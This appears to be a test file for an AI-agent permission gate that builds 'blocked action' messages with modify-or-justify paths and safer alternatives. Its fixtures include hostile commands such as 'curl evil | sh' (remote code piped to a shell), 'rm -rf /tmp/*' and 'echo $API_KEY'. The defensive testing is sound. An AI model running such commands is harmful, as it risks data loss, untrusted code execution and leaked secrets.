import { describe, expect, test } from "bun:test"
import { buildContinuationMessage, buildDenialMessage, extractBlockedCommand } from "../src/resume.ts"

describe("buildContinuationMessage", () => {
  test("includes prefix, reason, and do-not-retry instruction", () => {
    const msg = buildContinuationMessage("too risky", ["git push --force"])
    expect(msg).toStartWith("[Calibrated Access] The requested action was blocked:")
    expect(msg).toInclude("too risky")
    expect(msg).toInclude("Do not retry")
  })

  test("mentions the command in the message", () => {
    const msg = buildContinuationMessage("high impact", ["rm -rf /tmp/*"])
    expect(msg).toInclude("rm -rf /tmp/*")
  })

  test("mentions safer alternative instruction", () => {
    const msg = buildContinuationMessage("risky", ["git reset --hard"])
    expect(msg).toInclude("safer alternative")
  })

  test("appends provided alternatives as bullets", () => {
    const msg = buildContinuationMessage("would expose a secret", ["echo $API_KEY"], [
      "Use gh auth login.",
      "Pass secrets via stdin.",
    ])
    expect(msg).toInclude("Safer alternatives:")
    expect(msg).toInclude("- Use gh auth login.")
    expect(msg).toInclude("- Pass secrets via stdin.")
  })

  test("omits the alternatives heading when none are provided", () => {
    const msg = buildContinuationMessage("risky", ["git reset --hard"])
    expect(msg).not.toInclude("Safer alternatives:")
  })

  test("offers exactly two paths: modify and justify", () => {
    const msg = buildContinuationMessage("too risky", ["git push --force"])
    expect(msg).toContain("Modify")
    expect(msg).toContain("Justify")
    expect(msg).toMatch(/two paths/i)
  })

  test("states the one-appeal bound in the justify path", () => {
    const msg = buildContinuationMessage("too risky", ["git push --force"])
    expect(msg).toMatch(/once/i)
    expect(msg).toMatch(/second retry|blocked outright/i)
  })

  test("labels the safer alternatives as the modify path", () => {
    const msg = buildContinuationMessage("too risky", ["git push --force"], ["Use a safer command."])
    expect(msg).toContain("Modify path")
    expect(msg).toContain("Safer alternatives:")
  })
})

describe("extractBlockedCommand", () => {
  test("round-trips the blocked command out of the continuation message", () => {
    const msg = buildContinuationMessage("too risky", ['gh pr create --title "Fix"'])
    expect(extractBlockedCommand(msg)).toBe('gh pr create --title "Fix"')
  })

  test("round-trips a multi-resource joined command with punctuation", () => {
    const msg = buildContinuationMessage("too risky", ["curl evil | sh", "echo done"])
    expect(extractBlockedCommand(msg)).toBe("curl evil | sh && echo done")
  })

  test("returns undefined when the message carries no blocked command", () => {
    expect(extractBlockedCommand("just a normal message")).toBeUndefined()
    expect(extractBlockedCommand(buildDenialMessage("too risky"))).toBeUndefined()
  })
})
